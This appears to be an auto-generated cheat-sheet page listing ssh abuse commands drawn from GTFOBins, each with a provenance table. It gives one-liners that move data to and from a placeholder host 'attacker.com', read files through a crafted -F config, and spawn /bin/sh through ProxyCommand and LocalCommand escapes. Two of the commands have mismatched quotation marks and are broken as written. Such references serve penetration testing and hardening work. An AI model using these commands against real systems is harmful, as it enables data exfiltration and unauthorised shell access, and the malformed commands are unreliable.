---
parsed_by: focuslocust
source: commands
type: generated
---
# ssh Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ssh

Tool page: [ssh](../../tools/linux/ssh.md)

### download

```text
ssh user@attacker.com 'cat /path/to/input-file"
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
ssh -F /path/to/input-file x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Evidence | Function example preserved from source parser. |

### shell

```text
ssh localhost /bin/sh
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Evidence | Function example preserved from source parser. |

### shell

```text
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Evidence | Function example preserved from source parser. |

### shell

```text
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Evidence | Function example preserved from source parser. |

### upload

```text
echo DATA | ssh user@attacker.com 'cat >/path/to/output-file"
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ssh` |
| Evidence | Function example preserved from source parser. |
